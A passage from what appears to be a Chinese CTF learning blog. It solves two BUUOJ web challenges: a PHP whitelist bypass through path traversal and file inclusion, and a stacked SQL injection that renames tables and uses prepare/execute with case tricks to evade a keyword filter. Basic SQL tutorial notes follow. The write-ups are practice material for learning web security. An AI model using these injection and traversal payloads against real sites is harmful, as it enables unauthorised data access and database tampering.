class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">            $_page = urldecode($page);</span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $_page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>先看下面，file要有值，然后是个字符串，然后进入check类</p>
<p>要求：</p>
<ol>
<li><p>如果$page在白名单，则成功，但显然flag不在白名单，所以过~</p>
</li>
<li><p>以‘?’分割$page，</p>
</li>
<li><p>第一部分内容要在白名单内，构造file=source.php?</p>
<p>然后就可以通过判断了，那就不管了，直接读flag</p>
</li>
</ol>
<p>构造payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web5.buuoj.cn<span class="regexp">/index.php?file=source.php?../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>这一题就属于今天要学习的内容了，所以是面向Wp解题（两种解题方法）</p>
<p>首先提交试试</p>
<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223770751.png" alt="1564223770751"></p>
<p>然后测试注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span>' <span class="keyword">or</span> '<span class="number">1</span>'='<span class="number">1</span></span><br><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%20</span><span class="symbol">%271</span><span class="symbol">%27</span>=<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223854147.png" alt="1564223854147"></p>
<p>然后随便试了试发现过滤</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//web16.buuoj.cn/?inject=1where</span></span><br></pre></td></tr></table></figure>

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure>

<p>然后师傅们很牛逼的就知道他是堆叠注入了（学）</p>
<p>列数据库</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+databases%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show databases;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223974234.png" alt="1564223974234"></p>
<p>然后看表</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+tables%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224074931.png" alt="1564224074931"></p>
<p>再看这个数字表里的列</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+columns%<span class="number">20</span>from%<span class="number">20</span>`<span class="number">1919810931114514</span>`%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show columns from `<span class="number">1919810931114514</span>`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224134301.png" alt="1564224134301"></p>
<p>这个NO是不是代表不让读啊，反正师傅们都没去读它</p>
<p>顺便看看那个words表</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+columns%<span class="number">20</span>from%<span class="number">20</span>`words`%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show columns from `words`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224334629.png" alt="1564224334629"></p>
<p>这个复现环境里都是NO，可是原题是YES啊，那为啥flag不让直接读呢，（后来想想，大概是没这个语法2333）而是、、、</p>
<p>方法一：改名</p>
<p>9.他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。</p>
<p>先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。</p>
<p>这样就可以让程序直接查询出 flag 了。</p>
<p>构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。（改表名那里直接从 pma 拷了一个语句过来改- -）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1%27;<span class="keyword">RENAME</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`words`</span>%<span class="number">20</span><span class="keyword">TO</span>%<span class="number">20</span><span class="string">`words1`</span>;<span class="keyword">RENAME</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`1919810931114514`</span>%<span class="number">20</span><span class="keyword">TO</span>%<span class="number">20</span><span class="string">`words`</span>;<span class="keyword">ALTER</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`words`</span>%<span class="number">20</span><span class="keyword">CHANGE</span>%<span class="number">20</span><span class="string">`flag`</span>%<span class="number">20</span><span class="string">`id`</span>%<span class="number">20</span><span class="built_in">VARCHAR</span>(<span class="number">100</span>)%<span class="number">20</span><span class="built_in">CHARACTER</span>%<span class="number">20</span><span class="keyword">SET</span>%<span class="number">20</span>utf8%<span class="number">20</span><span class="keyword">COLLATE</span>%<span class="number">20</span>utf8_general_ci%<span class="number">20</span><span class="keyword">NOT</span>%<span class="number">20</span><span class="literal">NULL</span>;<span class="keyword">show</span>%<span class="number">20</span><span class="keyword">columns</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>words;<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">/?inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%20</span><span class="symbol">%271</span><span class="symbol">%27</span>=<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>由于过滤了 <strong>select</strong> 等关键字，我们可以用<strong>预编译</strong>来构造带有 <strong>select</strong> 的 <strong>sql</strong> 语句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prepare</span> presql <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> presql;</span><br><span class="line"><span class="keyword">deallocate</span> <span class="keyword">prepare</span> presql</span><br></pre></td></tr></table></figure>

<p>提示</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strstr</span><span class="params">(<span class="variable">$inject</span>, <span class="string">"set"</span>)</span></span> &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>

<p>于是用大小写绕过</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">1</span>'%<span class="number">3</span>bSet+%<span class="number">40</span>sqll%<span class="number">3</span>dconcat('sel','ect+*+from+`<span class="number">1919810931114514</span>`')%<span class="number">3</span>bPrepare+presql+from+%<span class="number">40</span>sqll%<span class="number">3</span>bexecute+presql%<span class="number">3</span>bdeallocate+Prepare+presql%<span class="number">3</span>b%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>感觉这题在buuoj上复现的时候，之所以被那么多少人解出来， 很可能是因为数据库已经被前人改了，所以直接就可以梭出来了。</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>由第二题引出今天的学习的内容，堆栈注入和预编译这两个小知识点。（还有SQL基础）</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>“Websites” 表的数据</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; set names utf8;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT <span class="symbol">*</span> FROM Websites;</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>解析</p>
<ul>
<li><strong>use RUNOOB;</strong> 命令用于选择数据库。</li>
<li><strong>set names utf8;</strong> 命令用于设置使用的字符集。</li>
<li><strong>SELECT * FROM Websites;</strong> 读取数据表的信息。</li>
<li>上面的表包含五条记录（每一条对应一个网站信息）和5个列（id、name、url、alexa 和country）。</li>
</ul>
<ul>
<li>SQL 对大小写不敏感：SELECT 与 select 是相同的。</li>
</ul>
<h4 id="SQL-语句后面的分号？"><a href="#SQL-语句后面的分号？" class="headerlink" title="SQL 语句后面的分号？"></a>SQL 语句后面的分号？</h4><p>某些数据库系统要求在每条 SQL 语句的末端使用分号。</p>
<p>分号是在数据库系统中分隔每条 SQL 语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的 SQL 语句。</p>
<p>在本教程中，我们将在每条 SQL 语句的末端使用分号。</p>
<h4 id="一些最重要的-SQL-命令"><a href="#一些最重要的-SQL-命令" class="headerlink" title="一些最重要的 SQL 命令"></a>一些最重要的 SQL 命令</h4><ul>
<li><strong>SELECT</strong> - 从数据库中提取数据</li>
<li><strong>UPDATE</strong> - 更新数据库中的数据</li>
<li><strong>DELETE</strong> - 从数据库中删除数据</li>
<li><strong>INSERT INTO</strong> - 向数据库中插入新数据</li>
<li><strong>CREATE DATABASE</strong> - 创建新数据库</li>
<li><strong>ALTER DATABASE</strong> - 修改数据库</li>
<li><strong>CREATE TABLE</strong> - 创建新表</li>
<li><strong>ALTER TABLE</strong> - 变更（改变）数据库表</li>
<li><strong>DROP TABLE</strong> - 删除表</li>
<li><strong>CREATE INDEX</strong> - 创建索引（搜索键）</li>
<li><strong>DROP INDEX</strong> - 删除索引</li>
</ul>
<h4 id="SQL-SELECT-语句"><a href="#SQL-SELECT-语句" class="headerlink" title="SQL SELECT 语句"></a>SQL SELECT 语句</h4><p>SQL SELECT 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">与</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-SELECT-DISTINCT-语句"><a href="#SQL-SELECT-DISTINCT-语句" class="headerlink" title="SQL SELECT DISTINCT 语句"></a>SQL SELECT DISTINCT 语句</h4><p>SELECT DISTINCT 语句用于返回唯一不同的值。</p>
<p>SQL SELECT DISTINCT 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> country <span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-WHERE-子句"><a href="#SQL-WHERE-子句" class="headerlink" title="SQL WHERE 子句"></a>SQL WHERE 子句</h4><p>WHERE 子句用于过滤记录。</p>
<p>SQL WHERE 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">operator</span> <span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>文本字段 vs. 数值字段</p>
<p>SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。</p>
<p>在上个实例中 ‘CN’ 文本字段使用了单引号。</p>
<p>如果是数值字段，请不要使用引号。</p>
<h4 id="SQL-AND-amp-OR-运算符"><a href="#SQL-AND-amp-OR-运算符" class="headerlink" title="SQL AND &amp; OR 运算符"></a>SQL AND &amp; OR 运算符</h4><p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country=<span class="string">'CN'</span> <span class="keyword">AND</span> alexa &gt; <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Websites WHERE <span class="attribute">country</span>=<span class="string">'USA'</span> <span class="keyword">OR</span> <span class="attribute">country</span>=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Websites WHERE alexa &gt; 15 <span class="keyword">AND</span> (<span class="attribute">country</span>=<span class="string">'CN'</span> <span class="keyword">OR</span> <span class="attribute">country</span>=<span class="string">'USA'</span>);</span><br></pre></td></tr></table></figure>

<h4 id="SQL-ORDER-BY-关键字"><a href="#SQL-ORDER-BY-关键字" class="headerlink" title="SQL ORDER BY 关键字"></a>SQL ORDER BY 关键字</h4><p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。</p>
<p>ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 DESC 关键字。</p>
<p>SQL ORDER BY 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name <span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name,column_name <span class="keyword">ASC</span>|<span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<p>下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列排序：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">ORDER</span> <span class="keyword">BY</span> alexa;</span><br></pre></td></tr></table></figure>

<p>ORDER BY 多列</p>
<p>下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “country” 和 “alexa” 列排序：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">ORDER</span> <span class="keyword">BY</span> country,alexa;</span><br></pre></td></tr></table></figure>

<p>ORDER BY 多列的时候，先按照第一个column name排序，在按照第二个column name排序；如上述教程最后一个例子：</p>
<ul>
<li>先将country值这一列排序，同为CN的排前面，同属USA的排后面；</li>
<li>然后在同属CN的这些多行数据中，再根据alexa值的大小排列。</li>
<li>ORDER BY 排列时，不写明ASC DESC的时候，默认是ASC。</li>
</ul>
<p>ORDER BY 多列的时候，eg:</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A,<span class="keyword">B </span>       这个时候都是默认按升序排列</span><br><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A desc,<span class="keyword">B </span>  这个时候 A 降序，<span class="keyword">B </span>升序排列</span><br><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A ,<span class="keyword">B </span>desc  这个时候 A 升序，<span class="keyword">B </span>降序排列</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INSERT-INTO-语句"><a href="#SQL-INSERT-INTO-语句" class="headerlink" title="SQL INSERT INTO 语句"></a>SQL INSERT INTO 语句</h4><p>INSERT INTO 语句用于向表中插入新记录。</p>
<p>SQL INSERT INTO 语法</p>
<p>INSERT INTO 语句可以有两种编写形式。</p>
<p>第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p>
<p>INSERT INTO <em>table_name</em><br>VALUES (<em>value1</em>,<em>value2</em>,<em>value3</em>,…);</p>
<p>第二种形式需要指定列名及被插入的值：</p>
<p>INSERT INTO <em>table_name</em> (<em>column1</em>,<em>column2</em>,<em>column3</em>,…)<br>VALUES (<em>value1</em>,<em>value2</em>,<em>value3</em>,…);</p>
<p>INSERT INTO 实例</p>
<p>假设我们要向 “Websites” 表中插入一个新行。</p>
<p>我们可以使用下面的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, <span class="keyword">url</span>, alexa, country) <span class="keyword">VALUES</span> (<span class="string">'百度'</span>,<span class="string">'https://www.baidu.com/'</span>,<span class="string">'4'</span>,<span class="string">'CN'</span>);</span><br></pre></td></tr></table></figure>

<p>在指定的列插入数据</p>
<p>我们也可以在指定的列插入数据。</p>
<p>下面的 SQL 语句将插入一个新行，但是只在 “name”、”url” 和 “country” 列插入数据（id 字段会自动更新）：</p>
<p>（alex值为0）</p>
<p>没有指定要插入数据的列名的形式需要列出插入行的每一列数据:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name</span><br><span class="line"><span class="keyword">VALUES</span> (value1,value2,value3,...);</span><br></pre></td></tr></table></figure>

<p>insert into select 和select into from 的区别（不是很懂，没有见过这么操作的，待解决）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> scorebak <span class="keyword">select</span> * <span class="keyword">from</span> socre <span class="keyword">where</span> neza=<span class="string">'neza'</span>   <span class="comment">--插入一行,要求表scorebak 必须存在</span></span><br><span class="line"><span class="keyword">select</span> *  <span class="keyword">into</span> scorebak <span class="keyword">from</span> score  <span class="keyword">where</span> neza=<span class="string">'neza'</span>  <span class="comment">--也是插入一行,要求表scorebak 不存在</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-UPDATE-语句"><a href="#SQL-UPDATE-语句" class="headerlink" title="SQL UPDATE 语句"></a>SQL UPDATE 语句</h4><p>UPDATE 语句用于更新表中已存在的记录。</p>
<p>SQL UPDATE 语法</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line"><span class="builtin-name">SET</span> <span class="attribute">column1</span>=value1,column2=value2,...</span><br><span class="line">WHERE <span class="attribute">some_column</span>=some_value;</span><br></pre></td></tr></table></figure>

<p>SQL UPDATE 实例</p>
<p>假设我们要把 “菜鸟教程” 的 alexa 排名更新为 5000，country 改为 USA。</p>
<p>我们使用下面的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Websites  <span class="builtin-name">SET</span> <span class="attribute">alexa</span>=<span class="string">'5000'</span>, <span class="attribute">country</span>=<span class="string">'USA'</span>  WHERE <span class="attribute">name</span>=<span class="string">'菜鸟教程'</span>;</span><br></pre></td></tr></table></figure>

<p>Update 警告！</p>
<p>在更新记录时要格外小心！在上面的实例中，如果我们省略了 WHERE 子句，如下所示：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Websites</span><br><span class="line"><span class="builtin-name">SET</span> <span class="attribute">alexa</span>=<span class="string">'5000'</span>, <span class="attribute">country</span>=<span class="string">'USA'</span></span><br></pre></td></tr></table></figure>

<p>执行以上代码会将 Websites 表中所有数据的 alexa 改为 5000，country 改为 USA。</p>
<p>执行没有 WHERE 子句的 UPDATE 要慎重，再慎重。</p>
<p>SQL DELETE 语句</p>
<p>DELETE 语句用于删除表中的行。</p>
<h4 id="SQL-DELETE-语法"><a href="#SQL-DELETE-语法" class="headerlink" title="SQL DELETE 语法"></a>SQL DELETE 语法</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> some_column=some_value;</span><br></pre></td></tr></table></figure>

<p>SQL DELETE 实例</p>
<p>假设我们要从 “Websites” 表中删除网站名为 “百度” 且国家为 CN 的网站 。</p>
<p>我们使用下面的 SQL 语句：</p>
<p>实例</p>
<p>DELETE FROM Websites WHERE name=’百度’ AND country=’CN’;</p>
<p>删除所有数据</p>
<p>您可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>SQL关于删除的三个语句：<strong>DROP</strong>、<strong>TRUNCATE</strong>、 <strong>DELETE</strong> 的区别。</p>
<p><strong>DROP:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>删除表test，并释放空间，将test删除的一干二净。</p>
<p><strong>TRUNCATE:</strong></p>
